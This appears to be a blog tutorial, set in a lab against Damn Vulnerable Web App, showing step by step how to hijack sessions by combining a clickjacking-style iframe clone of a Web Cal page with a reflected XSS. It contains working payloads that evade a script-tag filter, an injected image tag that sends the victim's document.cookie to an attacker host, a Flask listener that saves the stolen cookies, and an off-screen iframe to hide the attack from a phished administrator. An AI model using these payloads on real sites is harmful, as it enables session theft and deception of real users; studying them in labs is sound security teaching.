---
layout: post
title: Reflected XSS Attack Through iFrame
categories:
- reflected xss
- web hacking
---

Imagine we are targetting an instance of __Damn Vulnerable Web App__ on an enterprise network. In this totally realistic scenarior, there is also an instance of Web Cal running on the same network. The Web Cal instance is vulnerable to clickjacking. To gain access to DVWA, we can create a malicious web page that masquerades as the Web Cal instance using an iframe. We then could place a second iframe into the page that executes a reflected XSS attack against the target DVWA instance on page load. We could then use social engineering to trick a user into navigating to our fake Web Cal page, and by doing so steal the user's DVWA session. 

On my lab network, the attacking machine is located at 192.168.1.169. Both the DVWA instance and Web Cal are running on a shared server with an IP of 192.168.1.30. When you see these addresses in the tutorial, remember to substitute them for your own.

#Step 0

We start out by "cloning" the Web Cal instance using an iframe. Our index page is set up in such a way that the iframe expands to take up the entire width of the screen, no matter what device it is loaded on.

{% highlight html %}
{% raw %} 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Web Cal</title>
        <style type="text/css">
            body, html
            {
                margin: 0; padding: 0; height: 100%; overflow: hidden;
            }

            #content
            {
                position:absolute; left: 0; right: 0; bottom: 0; top: 0px; 
            }
        </style>
    </head>
    <body>
        <div id="content">
            <iframe width="100%" height="100%" frameborder="0" src="http://192.168.1.30/webcal/"></iframe>
        </div>

    </body>
</html>

{% endraw %} 
{% endhighlight %}

When we load the page, it looks exactly like the Web Cal instance.

#Step 1

Once we have "cloned" the Web Cal instance, it's time to find a reflected XSS vulnerability in the target site. For this example we will be using the Reflected XSS page on __Damn Vulnerable Web App__, with difficulty set to medium.

We start out by attempting to pass in a script tag directly through the URL using the __name__ parameter.

{% raw %} 
	http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<script>alert('xss');</script>#
{% endraw %} 

This request seems to fail, and looking at the source code reveals some kind of filtering.

![oops]({{ site.baseurl }}images/iframes/xss-fail.png)

Filters can sometimes be evaded by randomizing the capitilization of the script tags, as shown below.

{% raw %} 
	http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<sCriPt>alert('xss');</sCriPt>#
{% endraw %} 

Success - the filter evasion works.

![oops]({{ site.baseurl }}images/iframes/xss-success.png)

#Step 2

Now that we have identified a means to reflect scripts off of the page, let's try to execute a script that writes an image tag to the DOM. For our image, let's use this glorious picture of John Cena.

![john cena](http://www.wwe.com/f/styles/wwe_large/public/rd-talent/Bio/John_Cena_bio.png)

The following url should successfully load the image. We can't just straight up drop an image tag into the page, because doing so would not allow us to include the user's session cookie in the image tag. Insted we write the image tag to the DOM using a script tag.

{% raw %} 
	http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write('<img src=\"http://www.wwe.com/f/styles/wwe_large/public/rd-talent/Bio/John_Cena_bio.png\"></img>')</sCriPt>#

{% endraw %} 

#Step 3

Now that we can write images to the page, let's do it from an iframe. We take the URL we created in step 2 and use it as the frame's source. We place the iframe in the index.html file we created earlier.

{% highlight html %}
{% raw %} 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Test Layout</title>
        <style type="text/css">
            body, html
            {
                margin: 0; padding: 0; height: 100%; overflow: hidden;
            }

            #content
            {
                position:absolute; left: 0; right: 0; bottom: 0; top: 0px; 
            }
        </style>
    </head>
    <body>
        <div id="content">
            <iframe width="100%" height="100%" frameborder="0" src="http://192.168.1.30/webcal/"></iframe>
        </div>

	<iframe style="position:absolute;top:99px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write('<img src=\"http://www.wwe.com/f/styles/wwe_large/public/rd-talent/Bio/John_Cena_bio.png\"></img>')</sCriPt>#"></iframe>


    </body>
</html>

{% endraw %} 
{% endhighlight %}

We then try to access our index.html page. If we see John Cena inside the iframe, we know the image tag injection worked.

![oops]({{ site.baseurl }}images/iframes/oops.png)

Uh oh! Check out the results above. Simply escaping the double quotes for our image tag's source does not seem to be working. 

To fix this problem, we need to use html entities for the quotes in the image tag. We modify the iframe we added to index.html to look like this:

{% highlight html %}
{% raw %} 

	<iframe style="position:absolute;top:99px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write('<img src=&quot;http://www.wwe.com/f/styles/wwe_large/public/rd-talent/Bio/John_Cena_bio.png&quot;></img>')</sCriPt>#"></iframe>

{% endraw %} 
{% endhighlight %}

Success! John Cena has entered the iframe.

![oops]({{ site.baseurl }}images/iframes/cena-in-frame.png)

#Step 4

Now for the finishing touches of our attack. Let's get rid of John Cena and aim our image's src to a a non existent image tag on our server. We'll attempt to set the filename to the victim's cookie. If all goes according to plan, the user's cookie should show up in our httpd error log.

{% highlight html %}
{% raw %} 

	<iframe style="position:absolute;top:99px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write('<img src=&quot;192.168.1.169:4444?c='+document.cookie+'&quot;></img>')</sCriPt>#"></iframe>

{% endraw %} 
{% endhighlight %}

Tailing /var/log/httpd/error.log while making a request to http://localhost/ reveals that something isn't quite right. No record of our attempt to access the invalid image file shows up in our logs, which tells us that the request never happened in the first place.

![oops]({{ site.baseurl }}images/iframes/log-nope.png)

To learn why, we look at the source code of our loaded iframe. Notice how the image that we tried to write to the server does not contain any cookies. Instead, we see the following value for the tag's source attribute.

![oops]({{ site.baseurl }}images/iframes/concat-fail.png)

The problem is that since the image tag is being passed in through the URL, our plus signs are being converted into whitespace. This prevents us from easily using JavaScript string concatenation. The workaround is to use array joins instead.

{% highlight html %}
{% raw %} 

	<iframe style="position:absolute;top:99px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write(['<img src=&quot;http://192.168.1.169/',document.cookie,'.png&quot;></img>'].join(''))</sCriPt>#"></iframe>

{% endraw %} 
{% endhighlight %}

Tailing our log file while reloading the page once again, we see that the image request has gone through successfully. 

![oops]({{ site.baseurl }}images/iframes/log-win.png)

Awesome. Now all we have to do is modify the image url slightly so that it passes the victim's cookies as a GET parameter.


{% highlight html %}
{% raw %} 

	<iframe style="position:absolute;top:99px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write(['<img src=&quot;http://192.168.1.169:4444/?c=',document.cookie,'&quot;></img>'].join(''))</sCriPt>#"></iframe>

{% endraw %} 
{% endhighlight %}

We then use a quick Python script to set up a listener for the GET request.

{% highlight python %}
	
	from flask import Flask, request, render_template, abort
	from flask.ext.cors import CORS
	
	app = Flask(__name__)
	app.debug = True
	
	CORS(app)
	
	@app.route('/')
	def index():
	
	    cookies = request.args.get('c')
	    with open('cookies.txt', 'a') as fd:
	        print
	        print
	        print
	        print cookies
	        fd.write(cookies)
	    return abort(404)
	
	app.run(host='0.0.0.0', port=4444)

{% endhighlight %}


After reloading the page, we get the following output.


![oops]({{ site.baseurl }}images/iframes/cookies-stolen.png)

#Step 5

The mechanics behind the session hijacking attack are tested and complete. Now we just modify the iframe we added to our index.html page such that it is lifted completely outside of the visible portion of the page. By doing this, user is completely unaware that they've visited DVWA, let alone had their creds stolen.

{% highlight html %} 
{% raw %} 

	<iframe style="position:absolute;top:-9999px" src="http://192.168.1.30/dvwa/vulnerabilities/xss_r/?name=<ScrIpt>document.write(['<img src=&quot;http://192.168.1.169:4444/?c=',document.cookie,'&quot;></img>'].join(''))</sCriPt>#"></iframe>

{% endraw %} 
{% endhighlight %}

Here's a quick video on how the attack could play out. In the video, an email is sent to an administrator complaining that the Wiki page is down. The administrator opens the email, clicks the link, and navigates to what appears to be the Wiki page. The administrator's session is stolen, and the administrator navigates away from the page believing that the ticket is a false alarm.

<iframe width="560" height="315" src="https://www.youtube.com/embed/--9faUnC-k4" frameborder="0" allowfullscreen></iframe>

